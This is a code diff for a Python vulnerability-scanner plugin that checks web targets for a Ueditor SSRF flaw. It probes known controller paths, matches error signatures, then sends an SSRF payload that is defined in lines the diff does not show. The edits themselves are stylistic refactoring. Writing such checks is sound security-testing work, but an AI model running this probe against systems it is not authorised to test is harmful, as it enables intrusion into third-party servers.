@@ -1,10 +1,10 @@
 from xing.core.BasePlugin import BasePlugin
-from xing.utils import http_req, get_logger
+from xing.utils import http_req
 from xing.core import PluginType, SchemeType
 
 class Plugin(BasePlugin):
     def __init__(self):
-        super(Plugin, self).__init__()
+        super().__init__()
         self.plugin_type = PluginType.POC
         self.vul_name = "Ueditor SSRF 漏洞"
         self.app_name = 'Ueditor'
@@ -20,20 +20,20 @@ class Plugin(BasePlugin):
         paths.extend(["/module/ueditor/php/controller.php"])
 
         check_paths = [b'{"state":"\\u8bf7\\u6c42\\u5730\\u5740\\u51fa\\u9519"}']
-        check_paths.extend([b'{"state": "\u65e0\u6548\u7684Action"}'])
+        check_paths.extend([br'{"state": "\u65e0\u6548\u7684Action"}'])
         check_paths.extend([b'upload method not exists'])
 
-        self.logger.info("verify {}".format(target))
+        self.logger.info(f"verify {target}")
 
         for path in paths:
             url = target + path
             conn = http_req(url)
             for check_path in check_paths:
                 if check_path in conn.content and b"<" not in conn.content:
-                    self.logger.info("found ueditor controller {}".format(url))
+                    self.logger.info(f"found ueditor controller {url}")
                     ssrf_url = url + payload
                     conn_ssrf = http_req(ssrf_url)
                     if check in conn_ssrf.content and b"<" not in conn_ssrf.content:
-                        self.logger.success("found vul {}".format(ssrf_url))
+                        self.logger.success(f"found vul {ssrf_url}")
                         return ssrf_url
                     return
